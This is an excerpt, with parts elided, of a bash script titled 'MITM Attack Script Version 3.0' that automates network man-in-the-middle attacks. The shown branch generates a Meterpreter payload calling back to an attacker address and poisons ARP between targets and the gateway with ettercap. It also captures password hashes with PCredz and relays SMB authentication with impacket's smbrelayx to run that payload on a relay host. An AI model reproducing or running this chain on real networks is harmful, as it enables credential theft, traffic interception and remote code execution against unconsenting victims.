...
ScriptName="MITM Attack Script Version 3.0"
...
echo $RED"*    3.  SMB - Hash Relay                                    *";
echo $RED"*    4.  SMB - File Intercept                                *";
echo $RED"**************************************************************";
echo ""
...
echo
echo $BLUE"$ScriptName"
echo $BLUE"Ettercap Image SMB UNC Hash Capture"
echo
echo $RED"************************************************";
...
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER -t exe
...
if [ $attacktype -eq 3 ]; then
    ...
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
    xterm -bg blue -fg white -geometry 100x20+1000 -T "PCredz to Capture Hashes" -e "python /toolslinux/recon/pcredz/pcredz.py -i $INTERFACE"
    xterm -bg blue -fg white -geometry 100x50+1000 -T "SMB Relay" -e "python /toolslinux/exploits/impacket/impacket/smbrelayx/smbrelayx.py -h $RELAYIP -e ~/temp/final_.exe"
    echo $INTERFACE $TARGETS $GATEWAY
    xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -TqF http-img.ef -i $INTERFACE -M ARP:remote /$TARGETS/ /$GATEWAY/"
    echo ""
fi
